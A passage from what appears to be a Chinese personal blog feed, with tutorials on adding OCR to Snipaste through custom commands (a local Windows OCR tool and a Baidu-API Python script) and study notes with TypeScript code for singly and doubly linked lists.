<p>windows.media.ocr 是 Windows 10 操作系统提供的 OCR（光学字符识别）引擎。它使用图像处理算法来识别文本和数字，可用于将印刷或手写文本转换为可编辑的电子文件。该 API 支持多种语言和字体类型，并能够在不同分辨率的图像上工作。在开发应用程序时，开发人员可使用 windows.media.ocr 实现自动识别文本信息的功能。</p>
</blockquote>
<table>
<thead>
<tr>
<th>方案</th>
<th>OCR 工具</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://cuijunyu.win/20230310/%E6%90%AD%E9%85%8Dtesseract-ocr%E5%9C%A8Snipaste%E4%B8%AD%E6%94%AF%E6%8C%81ocr-%E9%9C%80%E9%AB%98%E7%BA%A7%E7%89%88/">方案 1</a></td>
<td>Tesseract-ocr</td>
<td>离线操作，支持各种系统</td>
<td>速度稍慢，准确度一般</td>
</tr>
<tr>
<td><a href="https://cuijunyu.win/20230421/%E4%BD%BF%E7%94%A8win10%E8%87%AA%E5%B8%A6%E6%9C%AC%E5%9C%B0ocr-api%E8%AE%A9Snipaste%E6%94%AF%E6%8C%81ocr-%E9%9C%80%E9%AB%98%E7%BA%A7%E7%89%88/">方案 2</a></td>
<td>Windows.Media.Ocr.Cli</td>
<td>离线使用，速度极快</td>
<td>只支持 Win10 以上系统，准确度逊于 Tesseract-ocr</td>
</tr>
<tr>
<td><a href="https://cuijunyu.win/20230421/Snipaste-OCR%E7%AF%873-%E4%BD%BF%E7%94%A8%E7%99%BE%E5%BA%A6api%E5%AE%9E%E7%8E%B0%E5%87%86%E7%A1%AE%E5%BA%A6%E6%9B%B4%E5%A5%BD%E7%9A%84ocr/">方案 3</a></td>
<td>百度 OCR 在线识别</td>
<td>准确度较高</td>
<td>需要网络，速度较慢</td>
</tr>
</tbody>
</table>
<p>由于使用到了自定义命令, 因此同样需要高级版</p>
<p>这种方法只支持 win10 以上系统, 速度飞快. 俺基于<a href="https://github.com/zh-h/Windows.Media.Ocr.Cli">Windows.Media.Ocr.Cli</a>二次开发了一个命令行 ocr 程序, <a href="/download/Windows.Media.Ocr.Cli.exe">直接下载</a> github 地址: <a href="https://github.com/cuicui-V5/Windows.Media.Ocr.Cli">link</a></p>
<h2 id="食用方法">食用方法</h2>
<ol>
<li class="lvl-3">
<p>将 <code>Windows.Media.Ocr.Cli.exe</code> 放置到一个你认为能找到的目录, 例如<code>D\temp\</code>,</p>
</li>
<li class="lvl-3">
<p>打开 Snipaste 的首选项-控制, 点击添加新命令</p>
<ol>
<li class="lvl-7">
<img src="/20230421/%E4%BD%BF%E7%94%A8win10%E8%87%AA%E5%B8%A6%E6%9C%AC%E5%9C%B0ocr-api%E8%AE%A9Snipaste%E6%94%AF%E6%8C%81ocr-%E9%9C%80%E9%AB%98%E7%BA%A7%E7%89%88/%E9%85%8D%E7%BD%AE1.png" class="" title="配置1">
</li>
<li class="lvl-7">
<img src="/20230421/%E4%BD%BF%E7%94%A8win10%E8%87%AA%E5%B8%A6%E6%9C%AC%E5%9C%B0ocr-api%E8%AE%A9Snipaste%E6%94%AF%E6%8C%81ocr-%E9%9C%80%E9%AB%98%E7%BA%A7%E7%89%88/%E9%85%8D%E7%BD%AE2.png" class="" title="配置2">
</li>
</ol>
</li>
<li class="lvl-3">
<p>名称随意填写, 命令填写如下</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snip -o &quot;D:\Temp\source.png&quot;;exec(cmd /c &quot;D:\Temp\Windows.Media.Ocr.Cli.exe&quot; -o  &quot;D:\Temp\ocrRes.txt&quot; &quot;D:\Temp\source.png&quot; &amp;&amp;  notepad &quot;D:\Temp\ocrRes.txt&quot;);</span><br></pre></td></tr></table></figure>
<p>这段命令的含义是首先调用 Snipaste 截图并存放于<code>D:\Temp\source.png</code>, 然后执行 cmd 命令, 调用<code>Windows.Media.Ocr.Cli.exe</code>进行 ocr 识别, 并将识别结果用记事本打开, 文件名和路径请根据自己需要修改</p>
</li>
<li class="lvl-3">
<p>随后指定一个快捷键即可体验飞快的 OCR 啦 !! 🤔🤔🤔🤔🤔🤔🤔🤔</p>
</li>
</ol>
]]></content>
      <categories>
        <category>软件技巧</category>
      </categories>
      <tags>
        <tag>ocr</tag>
        <tag>snipaste</tag>
      </tags>
  </entry>
  <entry>
    <title>Snipaste OCR篇3, 使用百度api实现准确度更好的ocr</title>
    <url>/20230421/Snipaste-OCR%E7%AF%873-%E4%BD%BF%E7%94%A8%E7%99%BE%E5%BA%A6api%E5%AE%9E%E7%8E%B0%E5%87%86%E7%A1%AE%E5%BA%A6%E6%9B%B4%E5%A5%BD%E7%9A%84ocr/</url>
    <content><![CDATA[<blockquote>
<p>20230526 更新:<br>
更新了脚本, 更好的处理了换行符问题如果段落以断句符结尾, 那么保留换行; 如果不以断句符结尾, 那么去掉换行</p>
</blockquote>
<p>之前的两篇文章介绍了使用 tesseract-ocr 与 win10 的自带 api 实现的 ocr 方法, 这两种方法的优点是本地识别, 速度较快, 但是准确度差强人意, 这里给出第三种方案–使用百度 api 在线识别, 这种方法同样基于高级版的自定义命令功能</p>
<table>
<thead>
<tr>
<th>方案</th>
<th>OCR 工具</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://cuijunyu.win/20230310/%E6%90%AD%E9%85%8Dtesseract-ocr%E5%9C%A8Snipaste%E4%B8%AD%E6%94%AF%E6%8C%81ocr-%E9%9C%80%E9%AB%98%E7%BA%A7%E7%89%88/">方案 1</a></td>
<td>Tesseract-ocr</td>
<td>离线操作，支持各种系统</td>
<td>速度稍慢，准确度一般</td>
</tr>
<tr>
<td><a href="https://cuijunyu.win/20230421/%E4%BD%BF%E7%94%A8win10%E8%87%AA%E5%B8%A6%E6%9C%AC%E5%9C%B0ocr-api%E8%AE%A9Snipaste%E6%94%AF%E6%8C%81ocr-%E9%9C%80%E9%AB%98%E7%BA%A7%E7%89%88/">方案 2</a></td>
<td>Windows.Media.Ocr.Cli</td>
<td>离线使用，速度极快</td>
<td>只支持 Win10 以上系统，准确度逊于 Tesseract-ocr</td>
</tr>
<tr>
<td><a href="https://cuijunyu.win/20230421/Snipaste-OCR%E7%AF%873-%E4%BD%BF%E7%94%A8%E7%99%BE%E5%BA%A6api%E5%AE%9E%E7%8E%B0%E5%87%86%E7%A1%AE%E5%BA%A6%E6%9B%B4%E5%A5%BD%E7%9A%84ocr/">方案 3</a></td>
<td>百度 OCR 在线识别</td>
<td>准确度较高</td>
<td>需要网络，速度较慢</td>
</tr>
</tbody>
</table>
<h2 id="使用方法">使用方法</h2>
<ol>
<li class="lvl-3">
<p>安装 python 运行环境</p>
</li>
<li class="lvl-3">
<p>申请百度 ocr api key. <a href="https://ai.baidu.com/tech/ocr">https://ai.baidu.com/tech/ocr</a></p>
</li>
<li class="lvl-3">
<p>将下列代码保存为 <code>ocr.pyw</code>, 后缀名为 <code>pyw</code> 可以实现后台运行, 不出现命令行窗口,<br>
顺便说一句这个代码完全是 gpt 生成的, 我除了修改了一下 key 以外啥都没改</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置API key和Secret Key</span></span><br><span class="line">API_KEY = <span class="string">&#x27;your_api_key&#x27;</span></span><br><span class="line">SECRET_KEY = <span class="string">&#x27;your_secret_key&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置请求URL和Content-type</span></span><br><span class="line">ocr_url = <span class="string">&quot;https://aip.baidubce.com/rest/2.0/ocr/v1/general_basic&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取图片文件并将其转换为base64编码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_content</span>(<span class="params">filePath</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filePath, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(fp.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发起API请求，获取识别结果</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ocr_image</span>(<span class="params">image_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 访问百度OCR API获取识别结果</span></span><br><span class="line">        response = requests.post(</span><br><span class="line">            ocr_url,</span><br><span class="line">            headers=headers,</span><br><span class="line">            params=&#123;<span class="string">&#x27;access_token&#x27;</span>: access_token&#125;,</span><br><span class="line">            data=&#123;<span class="string">&#x27;image&#x27;</span>: get_file_content(image_path)&#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="comment"># 解析JSON格式返回值</span></span><br><span class="line">            result = json.loads(response.content)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;words_result&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;\n&quot;</span>.join([item[<span class="string">&#x27;words&#x27;</span>] <span class="keyword">for</span> item <span class="keyword">in</span> result[<span class="string">&#x27;words_result&#x27;</span>]])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将识别结果写入输出文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_output</span>(<span class="params">output_path, text</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(text)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_extra_newlines</span>(<span class="params">text</span>):</span><br><span class="line">    p = <span class="string">r&#x27;([。.？?！!;；:：])\n+&#x27;</span></span><br><span class="line">    text = re.sub(p, <span class="string">r&#x27;\1\n&#x27;</span>, text)</span><br><span class="line">    p = <span class="string">r&#x27;([^。.？?！!;；:：])\n+&#x27;</span></span><br><span class="line">    text = re.sub(p, <span class="string">r&#x27;\1&#x27;</span>, text)</span><br><span class="line">    <span class="keyword">return</span> text.strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage: python ocr.py [image_path] [output_path]&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 通过API key和Secret Key获取访问令牌</span></span><br><span class="line">        token_url = <span class="string">&#x27;https://aip.baidubce.com/oauth/2.0/token&#x27;</span></span><br><span class="line">        response = requests.post(token_url, params=&#123;</span><br><span class="line">            <span class="string">&#x27;grant_type&#x27;</span>: <span class="string">&#x27;client_credentials&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;client_id&#x27;</span>: API_KEY,</span><br><span class="line">            <span class="string">&#x27;client_secret&#x27;</span>: SECRET_KEY</span><br><span class="line">        &#125;)</span><br><span class="line">        access_token = json.loads(response.text)[<span class="string">&#x27;access_token&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 进行文字识别并输出结果到指定文件</span></span><br><span class="line">        image_path = sys.argv[<span class="number">1</span>]</span><br><span class="line">        output_path = sys.argv[<span class="number">2</span>]</span><br><span class="line">        text = ocr_image(image_path)</span><br><span class="line">        text = remove_extra_newlines(text)</span><br><span class="line">        write_output(output_path, text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>将 <code>orc.pyw</code> 放置于你能找到的路径, 如 <code>D:\temp\</code></p>
</li>
<li class="lvl-3">
<p>打开 Snipaste 的首选项-控制, 点击添加新命令</p>
<ol>
<li class="lvl-7">
<img src="/20230421/Snipaste-OCR%E7%AF%873-%E4%BD%BF%E7%94%A8%E7%99%BE%E5%BA%A6api%E5%AE%9E%E7%8E%B0%E5%87%86%E7%A1%AE%E5%BA%A6%E6%9B%B4%E5%A5%BD%E7%9A%84ocr/%E9%85%8D%E7%BD%AE1.png" class="" title="配置1">
</li>
<li class="lvl-7">
<img src="/20230421/Snipaste-OCR%E7%AF%873-%E4%BD%BF%E7%94%A8%E7%99%BE%E5%BA%A6api%E5%AE%9E%E7%8E%B0%E5%87%86%E7%A1%AE%E5%BA%A6%E6%9B%B4%E5%A5%BD%E7%9A%84ocr/%E9%85%8D%E7%BD%AE2.png" class="" title="配置2">
</li>
</ol>
</li>
<li class="lvl-3">
<p>名称随意填写, 命令填写如下</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snip -o &quot;D:\Temp\source.png&quot;;exec(cmd /c &quot;D:\Temp\ocr.pyw&quot; &quot;D:\Temp\source.png&quot; &quot;D:\Temp\ocrRes.txt&quot;  &amp;&amp;  notepad &quot;D:\Temp\ocrRes.txt&quot;);</span><br></pre></td></tr></table></figure>
<p>这段命令的含义是首先调用 Snipaste 截图并存放于<code>D:\Temp\source.png</code>, 然后执行 cmd 命令, 调用<code>ocr.pyw</code>进行 ocr 识别, 并将识别结果用记事本打开, 文件名和路径请根据自己需要修改</p>
</li>
<li class="lvl-3">
<p>随后指定一个快捷键即可体验到速度没那么快但是准确度很高的 OCR 啦 !! 🤔🤔🤔🤔🤔🤔🤔🤔</p>
</li>
</ol>
]]></content>
      <categories>
        <category>软件技巧</category>
      </categories>
      <tags>
        <tag>ocr</tag>
        <tag>snipaste</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构学习-链表</title>
    <url>/20230308/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h1>链表</h1>
<p>链表是一种物理存储单元上非连续, 非顺序的存储结构, 数据元素的逻辑顺序是通过链表指针实现的, 链表由一些列结点组成, 每个节点包含两个部分: 一个是存储数据元素的数据域, 另一个是存储下一个结点地址的指针域</p>
<p>链表结构可以充分利用计算机内存空间, 实现灵活的内存动态管理, 但是链表失去了数组孙继读取的优点, 同时链表由于增加了结点的指针域, 空间开销比较大</p>
<h3 id="链表的特点">链表的特点</h3>
<ul class="lvl-0">
<li class="lvl-4">
<p>插入删除效率高 O(1), 只需要改变指针指向即可, 随机访问效率低 O(n)(需要从链头到链尾遍历)</p>
</li>
<li class="lvl-4">
<p>与数组相比, 内存空间消耗更大, 因为每个存储数据的节点都需要额外的空间存储后继指针</p>
</li>
</ul>
<p>‍</p>
<p>‍</p>
<h1>单链表</h1>
<p>单链表的每一个节点, 都包含了数据区域和 next 指向下一个节点的指针</p>
<img src="/20230308/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-%E9%93%BE%E8%A1%A8/%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8.png" class="" title="单向链表">
<h3 id="代码实现">代码实现</h3>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LinkNode</span> &#123;</span><br><span class="line">    <span class="attr">element</span>: <span class="built_in">any</span>;</span><br><span class="line">    <span class="attr">next</span>: <span class="title class_">LinkNode</span> | <span class="literal">null</span> | <span class="literal">undefined</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">element: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">element</span> = element;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">next</span> = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkedList</span> &#123;</span><br><span class="line">    <span class="attr">count</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="attr">head</span>: <span class="title class_">LinkNode</span> | <span class="literal">null</span> | <span class="literal">undefined</span>;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">count</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">head</span> = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">push</span>(<span class="params">element: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="comment">// 新建节点</span></span><br><span class="line">        <span class="keyword">const</span> newNode = <span class="keyword">new</span> <span class="title class_">LinkNode</span>(element);</span><br><span class="line">        <span class="comment">// 如果链表为空</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">head</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">count</span>++;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">head</span> = newNode;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">count</span>++;</span><br><span class="line">            <span class="keyword">let</span> current = <span class="variable language_">this</span>.<span class="property">head</span>;</span><br><span class="line">            <span class="comment">// 遍历链表, 直到最后一个元素</span></span><br><span class="line">            <span class="keyword">while</span> (current.<span class="property">next</span>) &#123;</span><br><span class="line">                current = current.<span class="property">next</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            current.<span class="property">next</span> = newNode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> newNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 删除指定位置的节点</span></span><br><span class="line">    <span class="title function_">removeAt</span>(<span class="params">index: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="attr">removeNode</span>: <span class="title class_">LinkNode</span> | <span class="literal">null</span> | <span class="literal">undefined</span>;</span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= <span class="variable language_">this</span>.<span class="property">count</span> || <span class="variable language_">this</span>.<span class="property">count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果删除第一个元素</span></span><br><span class="line">            <span class="keyword">if</span> (index == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 头指针指向第二个元素</span></span><br><span class="line">                removeNode = <span class="variable language_">this</span>.<span class="property">head</span>;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">head</span> = removeNode?.<span class="property">next</span>;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">count</span>--;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;要删除的元素是&quot;</span> + removeNode?.<span class="property">element</span>);</span><br><span class="line">                <span class="keyword">return</span> removeNode?.<span class="property">element</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果删除的不是第一个元素</span></span><br><span class="line">                <span class="comment">// 找到他的前一个元素</span></span><br><span class="line">                <span class="keyword">const</span> prev = <span class="variable language_">this</span>.<span class="title function_">getNodeAt</span>(index - <span class="number">1</span>);</span><br><span class="line">                removeNode = prev?.<span class="property">next</span>;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;要删除的元素是&quot;</span> + removeNode?.<span class="property">element</span>);</span><br><span class="line">                <span class="comment">// 要删除的元素前一个元素的next=要删除的元素后一个元素</span></span><br><span class="line">                prev!.<span class="property">next</span> = removeNode?.<span class="property">next</span>;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">count</span>--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> removeNode?.<span class="property">element</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">remove</span>(<span class="params">element: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> index = <span class="variable language_">this</span>.<span class="title function_">indexOf</span>(element);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (index === -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">removeAt</span>(index);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">indexOf</span>(<span class="params">element: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">        <span class="comment">// 根据数据, 返回索引</span></span><br><span class="line">        <span class="keyword">let</span> current = <span class="variable language_">this</span>.<span class="property">head</span>;</span><br><span class="line">        <span class="keyword">let</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (current?.<span class="property">next</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(current.<span class="property">element</span>) == <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(element)) &#123;</span><br><span class="line">                <span class="keyword">return</span> index;</span><br><span class="line">            &#125;</span><br><span class="line">            index++;</span><br><span class="line">            current = current?.<span class="property">next</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">getNodeAt</span>(<span class="params">index: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> current = <span class="variable language_">this</span>.<span class="property">head</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= <span class="variable language_">this</span>.<span class="property">count</span> || <span class="variable language_">this</span>.<span class="property">count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">                current = current?.<span class="property">next</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> current;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">toString</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> current = <span class="variable language_">this</span>.<span class="property">head</span>;</span><br><span class="line">        <span class="keyword">let</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span> (current) &#123;</span><br><span class="line">            str += <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(current.<span class="property">element</span>) + <span class="string">&quot;-&quot;</span>;</span><br><span class="line">            current = current?.<span class="property">next</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">insertElement</span>(<span class="params">element: <span class="built_in">any</span>, index: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt; <span class="variable language_">this</span>.<span class="property">count</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果插入最后一个元素</span></span><br><span class="line">        <span class="keyword">if</span> (index === <span class="variable language_">this</span>.<span class="property">count</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">push</span>(element);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> newNode = <span class="keyword">new</span> <span class="title class_">LinkNode</span>(element);</span><br><span class="line">        <span class="comment">// 如果在第一个元素之前插入</span></span><br><span class="line">        <span class="keyword">if</span> (index === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">count</span>++;</span><br><span class="line">            newNode.<span class="property">next</span> = <span class="variable language_">this</span>.<span class="property">head</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">head</span> = newNode;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">head</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 在指定位置插入一个元素</span></span><br><span class="line">        <span class="comment">// 新建一个节点, 新节点的next=插入位置的next, 插入位置的next=新节点,</span></span><br><span class="line">        <span class="comment">// 插入位置的节点</span></span><br><span class="line">        <span class="keyword">const</span> insertedNode = <span class="variable language_">this</span>.<span class="title function_">getNodeAt</span>(index - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (insertedNode) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">count</span>++;</span><br><span class="line">            newNode.<span class="property">next</span> = insertedNode?.<span class="property">next</span>;</span><br><span class="line">            insertedNode.<span class="property">next</span> = newNode;</span><br><span class="line">            <span class="keyword">return</span> newNode;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">size</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">count</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">isEmpty</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">size</span>() === <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>‍</p>
<p>‍</p>
<h3 id="单链表的应用">单链表的应用</h3>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 回文数检查</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">str: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="comment">// 全部转小写, 去掉空格</span></span><br><span class="line">    str = str.<span class="title function_">toLocaleLowerCase</span>().<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;处理后的字符串:&quot;</span> + str);</span><br><span class="line">    <span class="comment">// 将字符串加入队列</span></span><br><span class="line">    <span class="keyword">const</span> list = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; str.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        list.<span class="title function_">push</span>(str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> tag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取出首尾元素进行对比</span></span><br><span class="line">    <span class="keyword">while</span> (list.<span class="title function_">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (list.<span class="title function_">removeAt</span>(<span class="number">0</span>) !== list.<span class="title function_">removeAt</span>(list.<span class="title function_">size</span>() - <span class="number">1</span>)) &#123;</span><br><span class="line">            tag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(tag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">check</span>(<span class="string">&quot;abc dc bA&quot;</span>);</span><br></pre></td></tr></table></figure>
<h1>双向链表</h1>
<p>节点除了数据区域外, 还有两个指针, 分别为前驱指针 prev 和后继指针 next</p>
<img src="/20230308/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0-%E9%93%BE%E8%A1%A8/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8.png" class="" title="双向链表">
<p>在双向链表中删除元素需要考虑以下边界条件：</p>
<ol>
<li class="lvl-3">
<p>如果链表为空，不能进行删除操作。</p>
</li>
<li class="lvl-3">
<p>如果要删除的元素是头结点或者尾节点，则需要更新 <code>head</code>​ 或 <code>tail</code>​ 指针。</p>
</li>
<li class="lvl-3">
<p>如果要删除的元素不是头节点或尾节点，则需要更新其前驱节点的 <code>next</code>​ 指针和后继节点的 <code>prev</code>​ 指针。</p>
</li>
<li class="lvl-3">
